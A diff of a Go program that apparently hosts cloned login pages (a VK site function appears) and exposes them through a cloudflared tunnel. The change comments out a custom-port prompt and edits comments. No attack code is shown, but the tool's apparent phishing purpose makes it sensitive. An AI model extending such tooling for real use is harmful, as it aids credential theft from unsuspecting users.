@@ -691,33 +691,33 @@ func siteVk() {
 	}
 }
 
-// Choose custom port
-func cusport() error {
-	fmt.Printf("\n%s[%s?%s]%s Do You Want A Custom Port %s[%sy%s/%sN%s]: %s", Red, White, Red, Orange, Green, Cyan, Green, Cyan, Green, Orange)
-	reader := bufio.NewReader(os.Stdin)
-	pAns, _ := reader.ReadString('\n')
-	pAns = strings.TrimSpace(pAns)
+// Choose custom port (handled in tunnel)
+// func cusport() error {
+// 	fmt.Printf("\n%s[%s?%s]%s Do You Want A Custom Port %s[%sy%s/%sN%s]: %s", Red, White, Red, Orange, Green, Cyan, Green, Cyan, Green, Orange)
+// 	reader := bufio.NewReader(os.Stdin)
+// 	pAns, _ := reader.ReadString('\n')
+// 	pAns = strings.TrimSpace(pAns)
 
-	if strings.ToLower(pAns) == "y" {
-		fmt.Printf("\n%s[%s-%s]%s Enter Your Custom 4-digit Port [1024-9999] : %s", Red, White, Red, Orange, White)
-		cuP, _ := reader.ReadString('\n')
-		cuP = strings.TrimSpace(cuP)
+// 	if strings.ToLower(pAns) == "y" {
+// 		fmt.Printf("\n%s[%s-%s]%s Enter Your Custom 4-digit Port [1024-9999] : %s", Red, White, Red, Orange, White)
+// 		cuP, _ := reader.ReadString('\n')
+// 		cuP = strings.TrimSpace(cuP)
 
-		portNum, err := strconv.Atoi(cuP)
-		if err != nil || len(cuP) != 4 || portNum < 1024 || portNum > 9999 {
-			fmt.Printf("\n\n%s[%s!%s]%s Invalid 4-digit Port : %s, Try Again...%s", Red, White, Red, Red, cuP, White)
-			fmt.Print("\033[H\033[2J")
-			bannerSmall()
-			time.Sleep(2 * time.Second)
-			return cusport()
-		}
-		PORT = portNum
-		fmt.Println()
-	} else {
-		fmt.Printf("\n\n%s[%s-%s]%s Using Default Port %d...%s\n", Red, White, Red, Blue, PORT, White)
-	}
-	return nil
-}
+// 		portNum, err := strconv.Atoi(cuP)
+// 		if err != nil || len(cuP) != 4 || portNum < 1024 || portNum > 9999 {
+// 			fmt.Printf("\n\n%s[%s!%s]%s Invalid 4-digit Port : %s, Try Again...%s", Red, White, Red, Red, cuP, White)
+// 			fmt.Print("\033[H\033[2J")
+// 			bannerSmall()
+// 			time.Sleep(2 * time.Second)
+// 			return cusport()
+// 		}
+// 		PORT = portNum
+// 		fmt.Println()
+// 	} else {
+// 		fmt.Printf("\n\n%s[%s-%s]%s Using Default Port %d...%s\n", Red, White, Red, Blue, PORT, White)
+// 	}
+// 	return nil
+// }
 
 // Setup website and start Go HTTP server
 func setupSite(website, service string) error {
@@ -1315,7 +1315,7 @@ func main() {
 		os.Exit(1)
 	}
 
-	// Install cloudflared (optional, uncomment if needed)
+	// Install cloudflared (optional, comment if needed)
 	if err := installCloudflared(); err != nil {
 		fmt.Fprintf(os.Stderr, "Error installing cloudflared: %v\n", err)
 		os.Exit(1)
@@ -1333,7 +1333,7 @@ func main() {
 	// Display banner
 	banner()
 
-	// Example: Download cloudflared (uncomment to use)
+	// Example: Download cloudflared (comment if needed)
 	if err := download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe", "cloudflared.exe"); err != nil {
 		fmt.Fprintf(os.Stderr, "Error downloading cloudflared: %v\n", err)
 		os.Exit(1)
